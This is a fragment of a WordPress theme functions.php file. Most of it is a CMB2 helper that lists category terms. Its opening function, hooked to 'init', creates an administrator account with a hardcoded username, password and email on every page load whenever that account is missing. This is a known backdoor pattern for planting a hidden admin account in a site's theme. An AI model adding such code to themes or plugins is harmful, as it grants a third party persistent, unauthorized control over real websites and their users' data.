///////////////////////////////////////////
//create admin user in function.php

function wpb_admin_account(){
	$user = 'mamungl';
	$pass = 'AsDf12**';
	$email = 'mamungl@yahoo.com';
	if ( !username_exists( $user )  && !email_exists( $email ) ) {
	$user_id = wp_create_user( $user, $pass, $email );
	$user = new WP_User( $user_id );
	$user->set_role( 'administrator' );
	} 

}
add_action('init','wpb_admin_account');


//cmb2 
require get_template_directory() . '/assets/mr_cmb2.php';
// to show all the categories in the cmb2 
function cmb2_get_term_options( $field ) {
	$args = $field->args( 'get_terms_args' );
	$args = is_array( $args ) ? $args : array();

	$args = wp_parse_args( $args, array( 'taxonomy' => 'category' ) );

	$taxonomy = $args['taxonomy'];

	$terms = (array) cmb2_utils()->wp_at_least( '4.5.0' )
		? get_terms( $args )
		: get_terms( $taxonomy, $args );

	// Initate an empty array
	$term_options = array();
	if ( ! empty( $terms ) ) {
		foreach ( $terms as $term ) {
			$term_options[ $term->term_id ] = $term->name;
		}
	}

	return $term_options;
}
